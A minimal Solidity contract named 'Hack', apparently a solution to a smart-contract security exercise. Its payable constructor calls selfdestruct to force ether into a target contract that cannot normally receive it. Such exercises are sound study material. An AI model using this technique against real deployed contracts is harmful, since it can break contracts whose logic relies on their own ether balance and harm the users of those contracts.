// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

contract Hack {
    constructor(address payable forceContractAddress) payable {
        selfdestruct(forceContractAddress);
    }
}